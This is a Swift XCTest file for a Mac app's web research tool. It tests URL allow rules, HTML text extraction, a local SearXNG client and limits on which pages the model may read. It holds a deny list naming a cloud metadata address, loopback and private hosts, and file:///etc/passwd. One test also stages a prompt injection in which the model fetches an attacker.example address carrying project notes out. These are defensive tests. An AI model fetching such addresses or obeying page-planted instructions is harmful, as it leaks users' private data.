import XCTest
@testable import ProjectOS

/// Web research reaches outside the Mac, so these pin the rules that bound it:
/// which addresses may be fetched, what is kept from a page, and what the model
/// is allowed to ask for.
final class WebResearchTests: XCTestCase {

    // MARK: - Which addresses may be read

    func testOnlyPublicHTTPSAddressesAreReadable() {
        let allowed = [
            "https://example.com",
            "https://www.rvo.nl/subsidies/warmtepomp",
            "https://example.com:8443/page?q=1#section"
        ]
        for address in allowed {
            XCTAssertTrue(PublicWebURLPolicy.allows(URL(string: address)!), "\(address) should be readable")
        }

        let refused = [
            "http://example.com",                 // macOS blocks plain HTTP, and it can be rewritten in transit
            "https://user:secret@example.com",    // carries credentials
            "https://localhost/admin",
            "https://127.0.0.1:11434/api/tags",   // this Mac's own Ollama
            "https://127.1/api",                  // short form of a loopback address
            "https://10.0.0.5/",
            "https://192.168.1.1/",
            "https://172.20.0.4/",
            "https://169.254.169.254/latest/meta-data",
            "https://[::1]/",
            "https://[fd00::1]/",
            "https://printer.local/status",
            "https://intranet/",
            "file:///etc/passwd"
        ]
        for address in refused {
            guard let url = URL(string: address) else { continue }
            XCTAssertFalse(PublicWebURLPolicy.allows(url), "\(address) must not be readable")
        }
    }

    // MARK: - What is kept from a page

    func testPageTextKeepsReadingMatterAndDropsFurniture() {
        let html = """
        <html><head><title>  Heat pump subsidy  </title>
        <style>.a{color:red}</style><script>alert('x')</script></head>
        <body>
        <nav><a href="/">Home</a> <a href="/about">About</a></nav>
        <main>
        <h1>Subsidy 2026</h1>
        <p>The grant is &euro;2.500 for a hybrid pump &amp; more for a full one.</p>
        <ul><li>Apply before 1 July</li><li>Installation by a certified fitter</li></ul>
        </main>
        <footer>Copyright 2026</footer>
        </body></html>
        """

        let result = HTMLTextExtractor.extract(from: html)

        XCTAssertEqual(result.title, "Heat pump subsidy")
        XCTAssertTrue(result.text.contains("Subsidy 2026"))
        XCTAssertTrue(result.text.contains("The grant is €2.500 for a hybrid pump & more for a full one."))
        XCTAssertTrue(result.text.contains("- Apply before 1 July"))
        XCTAssertFalse(result.text.contains("alert"), "Scripts are not reading matter.")
        XCTAssertFalse(result.text.contains("color:red"))
        XCTAssertFalse(result.text.contains("Home"), "Navigation is not reading matter.")
        XCTAssertFalse(result.text.contains("Copyright"))
        XCTAssertFalse(result.text.contains("<"), "No markup survives.")
        XCTAssertFalse(result.text.contains("\n\n\n"), "Blank space is normalised.")
    }

    func testPageWithoutReadableTextIsReportedRatherThanKeptEmpty() async {
        let reader = WebPageReader(session: .stubbed(with: JavaScriptOnlyPageStub.self))
        do {
            _ = try await reader.read(URL(string: "https://example.com/app")!)
            XCTFail("A page with no text must not be kept.")
        } catch {
            XCTAssertEqual(error as? WebResearchError, .noReadableText)
        }
    }

    func testPageReadKeepsTitleAndAddressForProvenance() async throws {
        let reader = WebPageReader(session: .stubbed(with: ArticlePageStub.self))

        let page = try await reader.read(URL(string: "https://example.com/article")!)

        XCTAssertEqual(page.title, "Drainage rules")
        XCTAssertEqual(page.url.absoluteString, "https://example.com/article")
        XCTAssertTrue(page.text.contains("Rainwater must stay on the plot."))
        XCTAssertLessThan(page.fetchedAt.timeIntervalSinceNow, 1)
    }

    // MARK: - Searching

    func testSearchKeepsOnlyReadableResults() async throws {
        let client = try SearXNGClient(
            baseURL: URL(string: "http://127.0.0.1:8888")!,
            session: .stubbed(with: SearXNGResultsStub.self)
        )

        let results = try await client.search("drainage")

        XCTAssertEqual(results.map(\.url.absoluteString), ["https://example.com/a", "https://example.org/b"])
        XCTAssertEqual(results.first?.title, "A")
        XCTAssertEqual(results.first?.snippet, "First result")
    }

    func testSearchSaysWhenSearXNGWillNotAnswerInJSON() async throws {
        let client = try SearXNGClient(
            baseURL: URL(string: "http://127.0.0.1:8888")!,
            session: .stubbed(with: SearXNGForbiddenStub.self)
        )

        do {
            _ = try await client.search("drainage")
            XCTFail("A refused JSON format must be reported as such.")
        } catch {
            XCTAssertEqual(error as? WebResearchError, .jsonFormatDisabled)
        }
    }

    func testSearXNGMustRunOnThisMac() {
        XCTAssertThrowsError(try SearXNGClient(baseURL: URL(string: "https://searx.example.com")!))
        XCTAssertThrowsError(try SearXNGClient(baseURL: URL(string: "http://127.0.0.1")!))
        XCTAssertNoThrow(try SearXNGClient(baseURL: URL(string: "http://127.0.0.1:8888")!))
    }

    // MARK: - What the model may ask for

    func testPageCanOnlyBeReadAfterASearchFoundIt() async throws {
        let found = WebSearchResult(title: "A", url: URL(string: "https://example.com/a")!, snippet: "")
        let toolbox = WebResearchToolbox(
            searcher: FakeSearcher(results: [found]),
            reader: FakeReader(page: Self.page(url: "https://example.com/a")),
            userMessage: "What are the rules?"
        )

        let refused = try await toolbox.run(readCall("https://example.com/a"), stepID: UUID(), budget: 4_000)
        XCTAssertEqual(refused.step.status, .failed)
        XCTAssertTrue(refused.modelText.hasPrefix("Error:"))

        _ = try await toolbox.run(searchCall("rules"), stepID: UUID(), budget: 4_000)
        let allowed = try await toolbox.run(readCall("https://example.com/a"), stepID: UUID(), budget: 4_000)

        XCTAssertEqual(allowed.step.status, .done)
        XCTAssertEqual(allowed.step.page?.url.absoluteString, "https://example.com/a")
    }

    func testAddressFromTheQuestionMayBeReadWithoutSearching() async throws {
        let toolbox = WebResearchToolbox(
            searcher: FakeSearcher(results: []),
            reader: FakeReader(page: Self.page(url: "https://example.com/a")),
            userMessage: "Please read https://example.com/a and summarise it."
        )

        let outcome = try await toolbox.run(readCall("https://example.com/a"), stepID: UUID(), budget: 4_000)

        XCTAssertEqual(outcome.step.status, .done)
    }

    func testAddressSmuggledInByAPageIsRefused() async throws {
        let found = WebSearchResult(title: "A", url: URL(string: "https://example.com/a")!, snippet: "")
        let toolbox = WebResearchToolbox(
            searcher: FakeSearcher(results: [found]),
            reader: FakeReader(page: Self.page(url: "https://example.com/a")),
            userMessage: "What are the rules?"
        )
        _ = try await toolbox.run(searchCall("rules"), stepID: UUID(), budget: 4_000)

        // The shape of a prompt injection: a page tells the model to fetch an
        // address that carries project context out with it.
        let outcome = try await toolbox.run(readCall("https://attacker.example/collect?notes=budget"), stepID: UUID(), budget: 4_000)

        XCTAssertEqual(outcome.step.status, .failed)
        XCTAssertTrue(outcome.modelText.contains("search results"))
    }

    func testSearchesAreLimitedPerReply() async throws {
        let toolbox = WebResearchToolbox(
            searcher: FakeSearcher(results: []),
            reader: FakeReader(page: Self.page(url: "https://example.com/a")),
            userMessage: ""
        )

        for index in 0..<WebResearchToolbox.maximumSearches {
            let outcome = try await toolbox.run(searchCall("query \(index)"), stepID: UUID(), budget: 4_000)
            XCTAssertEqual(outcome.step.status, .done)
        }
        let beyond = try await toolbox.run(searchCall("one more"), stepID: UUID(), budget: 4_000)

        XCTAssertEqual(beyond.step.status, .failed)
        XCTAssertTrue(beyond.modelText.contains("limit"))
    }

    func testLongPageIsCutToTheBudgetButKeptWholeForSaving() async throws {
        let long = String(repeating: "Rainwater must stay on the plot. ", count: 500)
        let toolbox = WebResearchToolbox(
            searcher: FakeSearcher(results: []),
            reader: FakeReader(page: Self.page(url: "https://example.com/a", text: long)),
            userMessage: "Read https://example.com/a"
        )

        let outcome = try await toolbox.run(readCall("https://example.com/a"), stepID: UUID(), budget: 1_000)

        XCTAssertLessThanOrEqual(outcome.modelText.utf8.count, 1_000)
        XCTAssertTrue(outcome.modelText.contains("The page continues"))
        XCTAssertEqual(outcome.step.page?.text, long, "What is kept for citation is the whole page.")
    }

    // MARK: - Helpers

    private func searchCall(_ query: String) -> AIToolCall {
        AIToolCall(id: UUID().uuidString, name: WebResearchToolbox.searchToolName, arguments: "{\"query\":\"\(query)\"}")
    }

    private func readCall(_ address: String) -> AIToolCall {
        AIToolCall(id: UUID().uuidString, name: WebResearchToolbox.readToolName, arguments: "{\"url\":\"\(address)\"}")
    }

    private static func page(url: String, text: String = "Rainwater must stay on the plot.") -> WebPageSnapshot {
        WebPageSnapshot(url: URL(string: url)!, title: "Drainage rules", text: text, fetchedAt: Date())
    }
}

private struct FakeSearcher: WebSearching {
    let results: [WebSearchResult]
    func search(_ query: String) async throws -> [WebSearchResult] { results }
}

private struct FakeReader: WebPageReading {
    let page: WebPageSnapshot
    func read(_ url: URL) async throws -> WebPageSnapshot { page }
}

extension URLSession {
    /// A session that answers from a stub instead of the network.
    static func stubbed(with stub: URLProtocol.Type) -> URLSession {
        let configuration = URLSessionConfiguration.ephemeral
        configuration.protocolClasses = [stub]
        return URLSession(configuration: configuration)
    }
}

private final class SearXNGResultsStub: URLProtocol {
    override class func canInit(with request: URLRequest) -> Bool { true }
    override class func canonicalRequest(for request: URLRequest) -> URLRequest { request }

    override func startLoading() {
        let body = Data(#"""
        {"results":[
          {"url":"https://example.com/a","title":"A","content":"First result"},
          {"url":"http://example.com/insecure","title":"Insecure","content":""},
          {"url":"https://127.0.0.1:11434/api/tags","title":"Local","content":""},
          {"url":"https://example.org/b","title":"B","content":"Second result"},
          {"url":"https://example.com/a","title":"A again","content":"Duplicate"}
        ]}
        """#.utf8)
        let response = HTTPURLResponse(url: request.url!, statusCode: 200, httpVersion: nil, headerFields: ["Content-Type": "application/json"])!
        client?.urlProtocol(self, didReceive: response, cacheStoragePolicy: .notAllowed)
        client?.urlProtocol(self, didLoad: body)
        client?.urlProtocolDidFinishLoading(self)
    }

    override func stopLoading() {}
}

private final class SearXNGForbiddenStub: URLProtocol {
    override class func canInit(with request: URLRequest) -> Bool { true }
    override class func canonicalRequest(for request: URLRequest) -> URLRequest { request }

    override func startLoading() {
        let response = HTTPURLResponse(url: request.url!, statusCode: 403, httpVersion: nil, headerFields: nil)!
        client?.urlProtocol(self, didReceive: response, cacheStoragePolicy: .notAllowed)
        client?.urlProtocolDidFinishLoading(self)
    }

    override func stopLoading() {}
}

private final class ArticlePageStub: URLProtocol {
    override class func canInit(with request: URLRequest) -> Bool { true }
    override class func canonicalRequest(for request: URLRequest) -> URLRequest { request }

    override func startLoading() {
        let body = Data("""
        <html><head><title>Drainage rules</title></head>
        <body><article><p>Rainwater must stay on the plot.</p></article></body></html>
        """.utf8)
        let response = HTTPURLResponse(url: request.url!, statusCode: 200, httpVersion: nil, headerFields: ["Content-Type": "text/html; charset=utf-8"])!
        client?.urlProtocol(self, didReceive: response, cacheStoragePolicy: .notAllowed)
        client?.urlProtocol(self, didLoad: body)
        client?.urlProtocolDidFinishLoading(self)
    }

    override func stopLoading() {}
}

private final class JavaScriptOnlyPageStub: URLProtocol {
    override class func canInit(with request: URLRequest) -> Bool { true }
    override class func canonicalRequest(for request: URLRequest) -> URLRequest { request }

    override func startLoading() {
        let body = Data("<html><head><title>App</title></head><body><div id=\"root\"></div><script>render()</script></body></html>".utf8)
        let response = HTTPURLResponse(url: request.url!, statusCode: 200, httpVersion: nil, headerFields: ["Content-Type": "text/html"])!
        client?.urlProtocol(self, didReceive: response, cacheStoragePolicy: .notAllowed)
        client?.urlProtocol(self, didLoad: body)
        client?.urlProtocolDidFinishLoading(self)
    }

    override func stopLoading() {}
}
